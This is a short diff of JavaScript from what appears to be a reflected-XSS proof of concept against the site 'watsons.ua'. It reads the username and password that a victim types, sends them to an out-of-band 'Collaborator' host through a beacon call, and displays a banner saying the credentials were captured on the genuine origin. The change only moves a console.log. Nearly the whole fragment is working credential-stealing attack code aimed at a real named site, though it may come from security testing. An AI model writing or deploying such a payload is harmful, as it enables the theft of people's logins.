@@ -34,8 +34,7 @@
   d.title = 'watsons.ua';
   var cap = function () {
     var u = d.getElementById('u').value || '(blank)', p = d.getElementById('p').value || '(blank)';
-    beacon('creds?u=' + encodeURIComponent(u) + '&p=' + encodeURIComponent(p));
-     console.log(C)
+    beacon('creds?u=' + encodeURIComponent(u) + '&p=' + encodeURIComponent(p));console.log(C);
     ov.innerHTML = '<div style="background:#0b1020;color:#d6e2ff;padding:24px;border-radius:10px;font:14px Consolas,monospace;max-width:640px">' +
       'Captured &amp; sent to your Collaborator:'+C+'<br><br>username: ' + u.replace(/[<>&]/g, '') +
       '<br>password: ' + p.replace(/[<>&]/g, '') + '<br><br>Executed on the genuine ' + O + ' origin via reflected XSS.</div>';
